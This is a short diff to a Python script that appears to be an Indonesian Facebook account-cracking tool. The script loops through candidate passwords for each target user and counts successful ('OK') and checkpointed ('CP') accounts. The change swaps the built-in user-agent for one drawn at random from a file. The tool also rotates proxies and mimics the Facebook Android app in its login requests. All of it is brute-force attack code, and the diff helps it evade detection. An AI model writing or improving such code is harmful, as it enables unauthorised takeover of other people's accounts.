@@ -190,6 +190,8 @@ atau bisa juga menggunakan kata sandi otomatis [{hijau}password bawaan script{ha
     def __metode__(self, user, pasw, cebok):
         prog.update(des,description=f"{str(self.loop)}/{len(self.id)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
         prog.advance(des)
+        rr = open("uaku.txt", "r").read().splitlines()
+        uaa=random.choice(rr)
         for pw in pasw:
             try:
                 ssiidi = open("data/prox.txt","r").read().splitlines()
@@ -198,7 +200,7 @@ atau bisa juga menggunakan kata sandi otomatis [{hijau}password bawaan script{ha
                 head1 = {
                     "Host": cebok,
                     "upgrade-insecure-requests": "1",
-                    "user-agent": self.ua_set(),
+                    "user-agent": uaa,
                     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1",
                     "x-requested-with": "com.facebook.katana",
                     "sec-fetch-site": "none",
@@ -215,7 +217,7 @@ atau bisa juga menggunakan kata sandi otomatis [{hijau}password bawaan script{ha
                     "Host": cebok,
                     "content-length": "1737",
                     "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1),
-                    "user-agent": self.ua_set(),
+                    "user-agent": uaa,
                     "content-type": "application/x-www-form-urlencoded",
                     "accept": "*/*",
                     "origin": f"https://{cebok}",
